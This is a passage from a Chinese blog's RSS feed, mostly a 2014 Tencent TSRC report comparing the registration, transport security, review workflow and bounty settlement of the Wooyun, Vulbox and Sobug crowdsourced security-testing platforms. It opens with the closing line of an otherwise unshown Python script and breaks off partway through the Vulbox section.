class="pun">==</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;__main__&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">:</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;main</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">()</span></pre><p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px"><span style="box-sizing: border-box; color: #262626"><span style="box-sizing: border-box; font-weight: 700">[作者/zusheng，<a style="box-sizing: border-box; outline: none; color: #069aef; background: 0px 0px" href="http://www.primalsecurity.net/python-for-metasploit-automation/" target="_blank">原文地址</a>，转载请注明来自FreeBuf黑客与极客（FreeBuf.COM）]</span></span></p>
]]>
</description>
</item><item>
<link>http://i.renjihe.com/blog/read.php?6214</link>
<title><![CDATA[国内三大安全众测平台体验报告]]></title> 
<author>renjihe1988 &lt;admin@yourname.com&gt;</author>
<category><![CDATA[网络安全]]></category>
<pubDate>Tue, 09 Dec 2014 14:08:29 +0000</pubDate> 
<guid>http://i.renjihe.com/blog/read.php?6214</guid> 
<description>
<![CDATA[ 
	<p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong>博文作者：宋襄</strong></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong>发布日期：2014-07-29</strong></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong>阅读次数：3888</strong></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong>博文内容：</strong></p><br /><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span><br /></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong><span style="font-family: 微软雅黑, sans-serif">【TSRC编者按】<br /><br /></span></strong></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>随着众包（Crowd-sourcing）模式的兴起和发展，安全测试也进入了这一领域。对于中小企业来说，使用众包模式进行安全测试，相对自行组建安全团队或者购买安全服务更能节约成本，提高效率。<br /><br /></span></strong></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>目前国内有三大安全众测平台：乌云众测、漏洞盒子、Sobug白帽众测。为了对国内的安全众测平台进行体验和支持，腾讯安全应急响应中心（TSRC）特别与三大平台进行了合作，完成了本报告，供对该领域感兴趣的读者参考。</span></strong></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong><span style="font-size: 12pt; font-family: 微软雅黑, sans-serif">一）概述</span></strong></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">所谓安全众测，就是众包（Crowd-sourcing）模式在安全测试领域的一种表现。也就是企业把自己的产品给到安全众测平台，由平台的安全人员（这些安全人员也不隶属平台，而是来自互联网）进行安全测试。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>这种众包模式对没有自己的安全团队的中小企业帮助较大，可以低成本地发现和修复安全问题。对于有自己的安全团队的大型企业，也非常有用，第三方的安全测试报告可以帮助安全团队从另外的角度审视自己的能力和系统。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">如果按照上述定义，腾讯安全应急响应中心（TSRC）的漏洞提交平台（&nbsp;<a style="text-decoration: none; outline: none; color: #002e8c" href="http://security.tencent.com/">http://security.tencent.com</a>&nbsp;）也算是一个厂商自己的安全众测平台，不过没有固定的项目，而是所有产品线无限期参与众测。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>本文关注的是国内的第三方安全众测平台。目前国内有三家第三方安全众测平台：乌云众测、漏洞盒子和Sobug，为了对这些创业团队表示支持及对众测模式的探索，TSRC分别与三家平台达成了合作：我们各给出一款产品给到它们进行测试，TSRC以参与企业的角度输出这份体验报告。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>那么，开始我们的安全众测平台体验之旅吧。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong><span style="font-size: 12pt; font-family: 微软雅黑, sans-serif">二）乌云众测</span></strong></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"></p><div style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif"><img style="border: 0px; max-width: 854px" src="http://security.tencent.com/uploadimg_dir/201407/d635429abc8b5e2bd53d477e74a30d4f.png" border="0" /></span></div><span style="font-size: 14px; line-height: 24px; font-family: 微软雅黑, sans-serif; color: #333333"><br /></span><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif">图</span><span style="font-family: 微软雅黑, sans-serif">1&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">乌云众测平台宣传图</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>乌云众测（<a style="text-decoration: none; outline: none; color: #002e8c" href="http://ce.wooyun.org/home">http://ce.wooyun.org</a>&nbsp;）是国内著名漏洞报告平台乌云网（<a style="text-decoration: none; outline: none; color: #002e8c" href="http://www.wooyun.org/">http://www.wooyun.org</a>&nbsp;）的一个新的业务，它依托乌云平台上的优秀白帽子来进行安全测试工作，也是国内第一家安全众测平台，无论是从参与测试的人数还是参与人员的能力上来看，乌云众测应该都是目前国内比较强的。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">先从帐号注册说起。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>乌云众测是直接给厂商提供帐号和密码的，期间未见到其它的验证流程（身份鉴别），如果有冒充第三方厂商的恶意者，可能会存在一定风险。当然在早期可以人工审核，未来业务量大起来，可能就要考虑自动化验证了。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">从登录帐号起，乌云众测全程都未使用HTTPS传输，链路传输中容易被窃听，这点让对漏洞信息高度敏感的厂商比较介意。期望后续能够采用HTTPS传输。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">然后是体验问题。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">当有白帽子提交漏洞时，乌云众测会发系统消息提醒企业。最初乌云众测并没有直接的漏洞查看功能，后来添加了漏洞列表菜单，可惜又不是独立页面，而是躲在评估项目页面最下方一个不起眼的地方，不小心就忽视了，特别是对于漏洞审核者，在审核时确实有很多不便。这点在用户体验上确实有待改进。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"></p><div style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif"><img style="border: 0px; max-width: 854px" src="http://security.tencent.com/uploadimg_dir/201407/71cdce57a6e982870219ef5af4cb12df.png" border="0" /></span></div><span style="font-size: 14px; line-height: 24px; font-family: 微软雅黑, sans-serif; color: #333333"><br /></span><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif">图</span><span style="font-family: 微软雅黑, sans-serif">2&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">乌云众测平台消息提醒界面</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">白帽子提交漏洞后，乌云众测官方并不作审核，即使是重复提交或者提交的内容根本不是漏洞（比如抱怨产品用户体验差），都会直接反馈给厂商。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif"><img style="border: 0px; max-width: 854px" src="http://security.tencent.com/uploadimg_dir/201407/8a113600d073fa76fd588590cf868027.png" border="0" /><br /><br /></span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif">图</span><span style="font-family: 微软雅黑, sans-serif">3&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">与安全问题无关的提交示例</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">厂商在乌云众测上确认漏洞时，是无法直接给漏洞评级的。开始只有两个选项：&ldquo;忽略&rdquo;或者&ldquo;确认&rdquo;。必须在确认漏洞之后，原先的&ldquo;忽略&rdquo;才会变成评级按钮，可能部分厂商起初都会以为乌云众测上没漏洞评级功能（TSRC的几个小伙伴就这样中招了）。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>建议将&ldquo;确认&rdquo;操作与&ldquo;漏洞评级&rdquo;结合在一个操作上。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">乌云众测基本是按照&ldquo;漏洞确认&rdquo;、&ldquo;漏洞沟通&rdquo;、&ldquo;评级沟通&rdquo;、&ldquo;最终评级&rdquo;这样的流程来评定漏洞等级的，最终的评级由厂商、白帽子、平台三方共同讨论决定。虽然理解这是出于公平性的考虑，但是三方意见不容易一致，将会耗用较多的人力，拖慢审核进度。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">再来看看与白帽子的沟通便捷性。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">乌云众测主要通过评论的方式与参与的白帽子沟通，也无私信的方式，沟通成本稍高。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">这里再啰嗦一下供参考。因为TSRC在运营腾讯漏洞报告平台的过程中发现，大部分跟白帽子的分歧都是可以通过及时沟通解决的，所以TSRC特别重视跟白帽子的沟通，除了提供私信的方式之外，TSRC还在每个漏洞报告里都提供漏洞处理人员、当日值班工作人员、白帽子的一键QQ联系按钮，方便及时沟通解决问题，建议其它平台也可以参考之。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">接下来的阶段就是结算奖金。按最初的与乌云的商定协议是跟TSRC平台的奖励机制保持一致，TSRC也是为了维持两边的白帽子利益的公平性，所以评分完全参考TSRC官网PDF标准，安全币和人民币以1:4的比例进行兑换，重点鼓励高质量漏洞（额外1~10万的奖励），对此双方均表示同意。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>最后在与乌云众测结算奖金时，双方出现了意见分歧：乌云认为低危问题至少要奖励1000元，中危问题至少要奖励5000元；而我们则希望秉承&ldquo;公平公正公开&rdquo;的原则，坚持按照已确定的TSRC标准评定（也就是&ldquo;程序正义&rdquo;。只有先做到&ldquo;程序正义&rdquo;，才会有&ldquo;结果正义&rdquo;）。因此，建议厂商在参与安全众测前，充分沟通好相关事宜并签定书面合同，避免后期的分歧。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>值得肯定的是，虽然出现了分歧，但乌云众测方面决定按照自有规则补齐白帽子奖金的差额。我们可以看到，乌云对白帽子利益非常重视，甚至愿意牺牲自己的利益来弥补这里的损失。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>最后，乌云众测上发现的漏洞细节不会对外公开。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong><span style="font-size: 12pt; font-family: 微软雅黑, sans-serif">三）漏洞盒子</span></strong></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"></p><div style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif"><img style="border: 0px; max-width: 854px" src="http://security.tencent.com/uploadimg_dir/201407/cf651db3fb519bd14bf683b14e215d3d.png" border="0" /></span></div><span style="font-size: 14px; line-height: 24px; font-family: 微软雅黑, sans-serif; color: #333333"><br /></span><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif">图</span><span style="font-family: 微软雅黑, sans-serif">4&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">漏洞盒子宣传图</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>漏洞盒子（<a style="text-decoration: none; outline: none; color: #002e8c" href="https://www.vulbox.com/">https://www.vulbox.com</a>&nbsp;）是国内著名的安全媒体Freebuf（&nbsp;<a style="text-decoration: none; outline: none; color: #002e8c" href="http://www.freebuf.com/">http://www.freebuf.com</a>）推出的漏洞发现与处理平台。它依托Freebuf，影响力和能力也非常强大，漏洞盒子也是目前唯一有国外白帽子的众包安全测试平台。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">依然从帐号注册谈起。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>厂商需要先在平台上注册，然后由漏洞盒子发送激活邮件到厂商的注册邮箱，点击激活后才可使用，这里的注册流程相对来说要完善一些。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">漏洞盒子的站点是走HTTPS加密协议的，厂商再也不担心传输的安全啦。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif"><img style="border: 0px; max-width: 854px" src="http://security.tencent.com/uploadimg_dir/201407/1204f80663f62af5c101b96eebe3cfac.png" border="0" /><br /><br /></span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif">图</span><span style="font-family: 微软雅黑, sans-serif">5&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">漏洞盒子的HTTPS协议</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nb